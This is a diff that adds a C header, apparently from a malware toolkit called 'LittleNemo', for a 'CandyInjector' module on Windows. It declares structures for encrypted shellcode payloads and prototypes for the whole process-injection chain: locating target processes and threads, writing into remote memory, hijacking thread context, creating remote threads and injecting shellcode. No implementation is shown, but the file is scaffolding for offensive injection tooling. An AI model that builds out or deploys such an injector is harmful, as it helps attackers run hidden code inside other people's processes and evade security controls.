@@ -1,0 +1,50 @@
+#!name##LilNemo_CandyInjector_H
+#!itemType##sfile
+#!info##LittleNemo Candy header file.
+#!lang##c
+
+#ifndef LITTLE_NEMO_CANDY_INJECTOR_H
+#define LITTLE_NEMO_CANDY_INJECTOR_H
+
+#include "little_nemo_bag.h"
+
+#define LITTLE_NEMO_CANDY_INJECTOR_SCODE_BUFF_SIZE 4096
+#define LITTLE_NEMO_CANDY_INJECTOR_PROCESS_NAME_SIZE 256
+#define LITTLE_NEMO_CANDY_INJECTOR_PROCESS_LIST_NAME_SIZE 128
+
+typedef struct _LNC_PAYLOAD_SHELLCODE_BASIC {
+    uint16_t shellcode[LITTLE_NEMO_CANDY_INJECTOR_SCODE_BUFF_SIZE];
+    uint16_t key[LIL_NEMO_BAG_BUFF_SIZE];
+    int shellcode_size;
+    void *target_ptr;
+    int s_size;
+} LNC_PAYLOAD_SHELLCODE_BASIC, *pLNC_PAYLOAD_SHELLCODE_BASIC;
+
+typedef struct _LNC_NEMO_PROCESS_NAME {
+    uint16_t name[LITTLE_NEMO_CANDY_INJECTOR_PROCESS_NAME_SIZE];
+    DWORD pid;
+} LNC_NEMO_PROCESS_NAME, *pLNC_NEMO_PROCESS_NAME;
+
+typedef pLNC_PAYLOAD_SHELLCODE_BASIC (*NNType_CandyScodeFunc)(void);
+
+
+DWORD lil_nemo_candy_raw_find_proc_pid(char *process_name, pLIL_NEMO_BAG bag);
+DWORD lil_nemo_candy_find_thread_tid(DWORD proc_pid, pLIL_NEMO_BAG bag);
+DWORD lil_nemo_candy_find_proc_pid(uint16_t *process_name, pLIL_NEMO_BAG bag);
+HANDLE lil_nemo_candy_open_process(DWORD proc_pid, ACCESS_MASK acc_mask, pLIL_NEMO_BAG bag);
+PVOID lil_nemo_candy_allocate_memory(HANDLE proc, SIZE_T mem_size, ULONG allocation_type, ULONG mem_flags, pLIL_NEMO_BAG bag);
+SIZE_T lil_nemo_candy_write_memory(HANDLE proc, PVOID mem_addr, PVOID buffer, SIZE_T buff_size, pLIL_NEMO_BAG bag);
+BOOL lil_nemo_candy_suspend_thread(HANDLE th_handle, pLIL_NEMO_BAG bag);
+BOOL lil_nemo_candy_resume_thread(HANDLE th_handle, pLIL_NEMO_BAG bag);
+HANDLE lil_nemo_candy_open_thread(DWORD pid, DWORD th_id, ACCESS_MASK acc_mask, pLIL_NEMO_BAG bag);
+BOOL lil_nemo_candy_get_thread_context(HANDLE th_handle, LPCONTEXT ctx, pLIL_NEMO_BAG bag);
+BOOL lil_nemo_candy_set_thread_context(HANDLE th_handle, LPCONTEXT ctx, pLIL_NEMO_BAG bag);
+DWORD lil_nemo_candy_find_proc2(NNType_NemoFoodFuncList food_process_list, pLIL_NEMO_BAG bag);
+HANDLE lil_nemo_candy_create_remote_thread(HANDLE proc, PVOID start_func, PVOID args, ULONG create_flag, pLIL_NEMO_BAG bag);
+
+void lil_nemo_candy_func_inject_shellcode(pLNC_PAYLOAD_SHELLCODE_BASIC scode);
+void lil_nemo_candy_func_inject_shellcode_end(void);
+
+pLNC_PAYLOAD_SHELLCODE_BASIC lil_nemo_candy_prepare_shellcode(NNType_CandyScodeFunc raw_scode, uint16_t *ekey, pLIL_NEMO_BAG bag);
+
+#endif
